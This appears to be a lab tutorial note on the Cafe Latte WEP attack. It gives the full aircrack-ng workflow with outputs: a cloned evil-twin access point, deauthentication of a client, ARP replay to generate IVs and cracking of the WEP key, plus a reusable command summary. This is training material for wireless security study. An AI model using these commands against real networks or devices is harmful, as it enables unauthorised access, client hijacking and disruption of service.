---
title: Cafe-Latte Attack
description: Cafe-Latte Attack
date: '2026-09-22'
tags: []
published: true
slug: cafe-latte-attack
category: wifi
folder: diving-into-wep-attacks
order: 40
---
# The Cafe Latte Attack

## The Big Picture (Read This First)

Every WEP attack so far — ARP replay, fragmentation, chop chop — needed **traffic already happening on the real network** (like a client browsing the web, or sending ARP requests). If the network is quiet — no client activity — none of those attacks work.

**Cafe Latte solves this by flipping the target.** Instead of attacking the router, we **attack a client device directly**, tricking it into generating traffic for us — even if the real router is completely out of range or silent.

---

## The Analogy: Think of It Like a Fake WiFi Twin

Imagine a client's laptop remembers a network called "HackTheWifi" and will auto-connect to anything with that exact name and address.

**Cafe Latte's plan:**
1. We create a **fake router** with the exact same name (ESSID) and address (BSSID) as the real one
2. We **kick the client off** the real network (deauth)
3. The client's device, still looking for "HackTheWifi," connects to our **fake one** instead — thinking it's the real network
4. As the client tries to reconnect, it sends out **ARP requests** — exactly the traffic we need
5. We capture and replay those ARP requests over and over, generating tons of IVs
6. Crack the key with aircrack-ng, same as always

This is basically an "evil twin" attack, specifically built for WEP networks.

---

## Why You Need 4 Terminals

This attack has several moving parts running **at the same time**, so each one gets its own terminal:

| Terminal | Job |
|---|---|
| **1** | Capture all traffic and save IVs (airodump-ng) |
| **2** | Listen for the client and replay its ARP requests (aireplay-ng, Cafe Latte mode) |
| **3** | Run the fake access point pretending to be the real network (airbase-ng) |
| **4** | Kick the client off the real network so it reconnects to our fake one (aireplay-ng, deauth) |

Keep this table in mind — it'll make a lot more sense why each command below is running in its own window.

---

## Step 1: Enable Monitor Mode

```shellsession
iccys@htb[/htb]$ sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

Confirm it:

```shellsession
iccys@htb[/htb]$ iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

---

## Terminal 1: Start Capturing Traffic

```shellsession
iccys@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WEP

09:49:22  Created capture file "WEP-01.cap".

 CH  1 ][ Elapsed: 3 mins ][ 2024-08-06 09:53

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:D1:AC:E1:21:D1  -29   0     5011     8132   78   1   54   WEP  WEP    OPN  HackTheWifi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B2:D1:AC:E1:21:D1  B6:1F:98:CB:10:78  -29    1 - 1      0     9404         HackTheWifi
```

**What we learned:** Target router is `B2:D1:AC:E1:21:D1` ("HackTheWifi"), and there's one client: `B6:1F:98:CB:10:78`. Leave this running — this is the file everything eventually gets saved into.

---

## Terminal 2: Start the Cafe Latte Listener

```shellsession
iccys@htb[/htb]$ aireplay-ng -6 -D -b B2:D1:AC:E1:21:D1 -h B6:1F:98:CB:10:78 wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether B6:1F:98:CB:10:78
Saving ARP requests in replay_arp-0806-094956.cap
You should also start airodump-ng to capture replies.
Read 99 packets (got 0 ARP requests), sent 0 packets...
```

**What each part means:**

| Part | Meaning |
|---|---|
| `-6` | Cafe Latte attack mode |
| `-D` | Disables AP detection (needed since we're targeting a client, not the real AP) |
| `-b` | Target router's BSSID |
| `-h` | Target client's MAC address |

**Right now, this is just waiting.** It's watching for the client to send ARP requests so it can replay them. Nothing to worry about yet — 0 ARP requests is expected at this stage, since the client hasn't connected to our trap yet.

---

## Terminal 3: Launch the Fake Access Point

This is the actual "trap" — a fake router pretending to be the real one:

```shellsession
iccys@htb[/htb]$ airbase-ng -c 1 -a B2:D1:AC:E1:21:D1  -e "HackTheWifi" wlan0mon -W 1 -L

09:50:40  Created tap interface at0
09:50:40  Trying to set MTU on at0 to 1500
09:50:40  Trying to set MTU on wlan0mon to 1800
09:50:40  Access Point with BSSID B2:D1:AC:E1:21:D1 started.
```

**What each part means:**

| Part | Meaning |
|---|---|
| `-c 1` | Same channel as the real network |
| `-a B2:D1:AC:E1:21:D1` | **Same BSSID** as the real router (this is the key deception) |
| `-e "HackTheWifi"` | **Same network name** as the real one |
| `-W 1` | Run in WEP mode (to match the real network's security type) |
| `-L` | Enable Cafe Latte attack mode |

At this point, our fake network is broadcasting, identical in every way (except it's not the real router) to the client's device.

---

## Terminal 4: Kick the Client Off the Real Network

Now we force the client to disconnect from the real AP, so it goes looking for "HackTheWifi" again — and finds our fake one instead:

```shellsession
iccys@htb[/htb]$ aireplay-ng -0 10 -a B2:D1:AC:E1:21:D1 -c B6:1F:98:CB:10:78  wlan0mon

09:51:22  Waiting for beacon frame (BSSID: D8:D6:3D:EB:29:D5) on channel 1
09:51:23  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:24  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:25  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:27  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:29  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:30  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:31  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:32  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:34  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:35  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
```

This is the same deauth attack from way back in the very first aireplay-ng guide — nothing new here, just aimed at forcing a reconnect.

---

## Watching It Work: Terminal 3 Comes Alive

Once the client is kicked off, watch Terminal 3 — you should see the client connecting to your **fake** network instead of the real one:

```shellsession
iccys@htb[/htb]$ airbase-ng -c 1 -a B2:D1:AC:E1:21:D1  -e "HackTheWifi" wlan0mon -W 1 -L

09:50:40  Created tap interface at0
09:50:40  Trying to set MTU on at0 to 1500
09:50:40  Trying to set MTU on wlan0mon to 1800
09:50:40  Access Point with BSSID B2:D1:AC:E1:21:D1 started.
09:50:53  Starting Caffe-Latte attack against B6:1F:98:CB:10:78 at 100 pps.
09:51:23  Client B6:1F:98:CB:10:78 associated (WEP) to ESSID: "HackTheWifi"
09:51:35  Client B6:1F:98:CB:10:78 associated (WEP) to ESSID: "HackTheWifi"
09:51:35  Client B6:1F:98:CB:10:78 associated (WEP) to ESSID: "HackTheWifi"
09:51:35  Client B6:1F:98:CB:10:78 associated (WEP) to ESSID: "HackTheWifi"
09:51:55  Client B6:1F:98:CB:10:78 associated (WEP) to ESSID: "HackTheWifi"
```

🎉 **The trap worked** — the line `"Client ... associated (WEP)"` confirms the client connected to *our* fake network, thinking it was the real one.

---

## Watching It Work: Terminal 2 Springs Into Action

Now go back to Terminal 2 — this is where the payoff happens:

```shellsession
iccys@htb[/htb]$ aireplay-ng -6 -D -b B2:D1:AC:E1:21:D1 -h B6:1F:98:CB:10:78 wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether B6:1F:98:CB:10:78
Saving ARP requests in replay_arp-0806-094956.cap
You should also start airodump-ng to capture replies.
Notice: got a deauth/disassoc packet. Is the source MAC associated ?
Notice: got a deauth/disassoc packet. Is the source MAC associated ?
Read 171321 packets (9269 ARPs, 0 ACKs), sent 84553 packets...(479 pps)
```

**What happened here:** As the client connects to our fake network, its device sends out ARP requests (trying to figure out its network settings). This terminal grabs those ARP requests and replays them repeatedly — exactly like the ARP Request Replay attack, just triggered against our fake AP instead of the real one.

Notice the count: **9,269 ARPs captured, 84,553 packets sent** — that's a lot of fresh IVs being generated back in Terminal 1's `WEP-01.cap` file.

📝 **The "Notice: got a deauth/disassoc" messages are normal** — they're just leftover noise from the deauth attack in Terminal 4, and don't indicate a problem.

---

## Step Final: Crack the Key

Once you've built up enough IVs (same 20,000+ range as other WEP attacks), crack it as usual:

```shellsession
iccys@htb[/htb]$ aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap

Reading packets, please wait...
Opening WEP-01.cap
Read 195576 packets.

1 potential targets
Got 97822 out of 95000 IVs
Starting PTW attack with 97822 ivs.
                     KEY FOUND! [ 33:44:55:22:11 ]
Attack Decrypted correctly: 100% captured ivs.
```

🎉 **Success!** The key is `33:44:55:22:11`.

---

## If It's Not Working

📝 **Common troubleshooting tip:** If Terminal 2 isn't capturing any ARP packets after a while, it usually means the client hasn't reconnected yet. Try:
1. Re-running the deauth attack (Terminal 4) again
2. Then **immediately** re-running the `airbase-ng` command (Terminal 3)

Timing matters here — the client needs to be actively looking for a network right as your fake AP is ready to catch it.

---

## Quick Recap: Why Each Piece Matters

| Step | Without it... |
|---|---|
| Fake AP with matching name/BSSID | The client would never mistake it for the real network |
| Deauth attack | The client would stay happily connected to the real router, never coming to us |
| Cafe Latte listener (aireplay-ng -6) | We'd see the client connect, but never capture/replay its ARP traffic |
| airodump-ng capturing | We'd generate lots of traffic but never actually save the IVs anywhere |

Every terminal has a distinct job, and they all depend on each other running simultaneously.

---

## Command Summary

```bash
sudo airmon-ng start wlan0                                                     # Enable monitor mode
iwconfig                                                                       # Confirm monitor mode
airodump-ng wlan0mon -c 1 -w WEP                                               # Terminal 1: capture traffic & IVs
aireplay-ng -6 -D -b <BSSID> -h <client MAC> wlan0mon                         # Terminal 2: Cafe Latte listener
airbase-ng -c <channel> -a <BSSID> -e "<ESSID>" wlan0mon -W 1 -L              # Terminal 3: fake access point
aireplay-ng -0 10 -a <BSSID> -c <client MAC> wlan0mon                         # Terminal 4: deauth the client
aircrack-ng -b <BSSID> WEP-01.cap                                              # Crack the WEP key
```

**What each argument means:**

| Argument | Meaning |
|---|---|
| `-6` | Cafe Latte attack mode (aireplay-ng) |
| `-D` | Disable AP detection |
| `-b <BSSID>` | Target router's MAC address |
| `-h <MAC>` | Target client's MAC address |
| `-c <channel>` (airbase-ng) | Which channel to broadcast the fake AP on |
| `-a <BSSID>` (airbase-ng) | The BSSID to fake — must match the real router |
| `-e "<ESSID>"` | The network name to fake — must match the real router |
| `-W 1` | Run the fake AP in WEP mode |
| `-L` | Enable Cafe Latte mode on the fake AP |
| `-0 10` | Send 10 deauth packets |
| `-c <client MAC>` (this specific aireplay-ng deauth command) | The client to disconnect |

